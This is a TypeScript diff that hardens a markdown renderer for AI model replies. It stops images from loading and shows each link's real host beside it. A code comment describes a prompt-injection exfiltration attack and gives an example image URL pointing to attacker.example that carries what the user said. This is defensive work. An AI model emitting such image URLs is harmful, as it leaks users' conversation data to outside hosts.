@@ -157,6 +157,13 @@ function safeUrl(url: string): string {
 }
 
 const LINK = /\[([^\]]+)\]\(([^)\s]+)\)/g;
+/**
+ * `![alt](url)`. Never turned into an <img>: the browser would fetch the URL the
+ * moment the reply is drawn, with no click, and a model that has been talked into
+ * writing `![](https://attacker.example/?d=<what the user said>)` would hand that
+ * data over by itself. It stays inert text, and the address is not shown.
+ */
+const IMAGE = /!\[([^\]]*)\]\(([^)\s]+)\)/g;
 /** Marks where a finished link sits while the rest of the line is formatted. */
 const SLOT = /\uE000(\d+)\uE000/g;
 
@@ -173,10 +180,33 @@ function emphasis(t: string): string {
  * with one in the label and wrap an <em> across the tag. Nothing could break
  * out of the attribute (quotes are already escaped), but the markup was wrong.
  */
+/** Where a link really goes, for showing next to it; "" when it is not an http(s) address. */
+function hostOf(url: string): string {
+  if (!/^https?:\/\//i.test(url)) return "";
+  try {
+    // The text has been HTML-escaped as a whole, so an & in the address is &amp; here.
+    return new URL(url.replace(/&amp;/g, "&")).hostname.replace(/^www\./, "");
+  } catch {
+    return "";
+  }
+}
+
 function inlineFmt(t: string): string {
   const links: string[] = [];
-  const slotted = t.replace(LINK, (_m, label: string, url: string) => {
-    links.push(`<a href="${safeUrl(url)}" class="md-link" target="_blank" rel="noopener noreferrer">${emphasis(label)}</a>`);
+  // Images first, so the `!` and the brackets are gone before LINK looks at them.
+  const noImages = t.replace(IMAGE, (_m, alt: string) => {
+    links.push(`<span class="md-img-blocked" title="Images in replies are not loaded">[image${alt.trim() ? `: ${alt.trim()}` : ""}]</span>`);
+    return `\uE000${links.length - 1}\uE000`;
+  });
+  const slotted = noImages.replace(LINK, (_m, label: string, url: string) => {
+    // The destination is written out beside the label, so a link whose words say one
+    // thing and whose address says another cannot hide it. no-referrer: a click
+    // does not tell the other site which page, or which project, it came from.
+    const host = hostOf(url);
+    links.push(
+      `<a href="${safeUrl(url)}" class="md-link" target="_blank" rel="noopener noreferrer nofollow" referrerpolicy="no-referrer">${emphasis(label)}</a>` +
+      (host ? `<span class="md-link-host"> (${host})</span>` : ""),
+    );
     return `\uE000${links.length - 1}\uE000`;
   });
   return emphasis(slotted).replace(SLOT, (_m, n: string) => links[Number(n)] ?? "");
